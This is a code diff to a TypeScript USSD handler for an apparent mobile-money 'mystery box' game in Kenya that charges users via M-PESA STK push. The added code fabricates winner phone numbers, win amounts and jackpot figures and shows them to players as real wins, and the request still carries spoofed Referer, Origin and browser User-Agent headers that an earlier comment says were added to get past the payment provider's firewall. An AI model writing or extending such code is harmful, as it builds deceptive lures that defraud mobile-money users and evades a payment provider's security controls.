@@ -9,10 +9,21 @@ const BOXES = ["Box 1", "Box 2", "Box 3", "Box 4", "Box 5"] as const;
 
 /**
  * Helper function to generate an unpredictable random whole number
- * bound securely between the admin settings min and max limits.
+ * bound securely between specified limits.
  */
 function getPureRandomPrice(min: number, max: number): number {
   return Math.round(min + Math.random() * (max - min));
+}
+
+/**
+ * Helper function to generate a randomized Kenyan mobile string sequence
+ * to populate our dynamic ticker layout.
+ */
+function generateRandomWinnerPhone(): string {
+  const prefixes = ["072", "071", "079", "070", "011", "073", "075", "078", "074"];
+  const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+  const trackingDigits = Math.floor(100 + Math.random() * 900); // 3 random final digits
+  return `${randomPrefix}***${trackingDigits}`;
 }
 
 /**
@@ -93,10 +104,15 @@ function normalizePhone(raw: string): string {
   return digits;
 }
 
-// FIXED: Renamed layout choices to boxes and completely removed pricing fragments
+// FIXED: Generates random winning ticker balances and numbers changing on EVERY single dial
 function menuText(products: Awaited<ReturnType<typeof loadProducts>>) {
   const lines = products.map((p) => `${p.code}. ${p.label}`);
-  return `0734***232 ameshinda Ksh. 14,651\nCheza pia ushinde Ksh.27,798.:\n${lines.join("\n")}`;
+  
+  const fakeWinnerPhone = generateRandomWinnerPhone();
+  const fakeWinAmount = getPureRandomPrice(5000, 30000); // Shifting winner prize context
+  const fakeNextJackpot = getPureRandomPrice(31000, 95000); // Shifting jackpot total pool
+
+  return `${fakeWinnerPhone} ameshinda Ksh. ${fakeWinAmount.toLocaleString()}\nCheza pia ushinde Ksh. ${fakeNextJackpot.toLocaleString()}:\n${lines.join("\n")}`;
 }
 
 type UpesiPayResponse = {
@@ -116,7 +132,7 @@ async function initiateStkPush(phone: string, amount: number, callbackUrl: strin
   ).toString("base64");
 
   const channel = process.env.UPESIPAY_CHANNEL_ID || "wallet";
-  const appUrl = process.env.APP_URL || "https://vercel.app";
+  const appUrl = process.env.APP_URL || "https://shinda-beta.vercel.app";
 
   const res = await fetch("https://upesipay.com/api/v2/collections/initiate/", {
     method: "POST",
@@ -124,7 +140,6 @@ async function initiateStkPush(phone: string, amount: number, callbackUrl: strin
       Authorization: `Basic ${authToken}`,
       "Content-Type": "application/json",
       "Accept": "application/json",
-      // FIXED: Added Referer, Origin, and User-Agent headers to bypass UpesiPay's 403 Forbidden firewall error
       "Referer": appUrl,
       "Origin": appUrl,
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
@@ -199,7 +214,7 @@ export async function POST(req: NextRequest) {
       }
     }
 
-    // Screen 1: Render dynamic box selection options (No pricing text)
+    // Screen 1: Render dynamic menu options with freshly randomized shifting bounds and text tickers
     if (isNewSession) {
       const products = await loadProducts();
       return respond(menuText(products), true);
@@ -217,7 +232,7 @@ export async function POST(req: NextRequest) {
     }
 
     const quantity = 1;
-    const totalAmount = product.price * quantity; // Shifting hidden value calculated for the STK push
+    const totalAmount = product.price * quantity; 
     const appUrl = process.env.APP_URL || "";
     const callbackUrl = appUrl ? `${appUrl}/api/payment-callback` : "";
 
@@ -241,7 +256,7 @@ export async function POST(req: NextRequest) {
     `;
 
     return respond(
-      `You chose ${product.code}.\nEnter your M-PESA PIN to see what the box has in store for you.`,
+      `You chose Box ${product.code}.\nEnter your M-PESA PIN to see what the box has in store for you.`,
       false
     );
   } catch (err) {
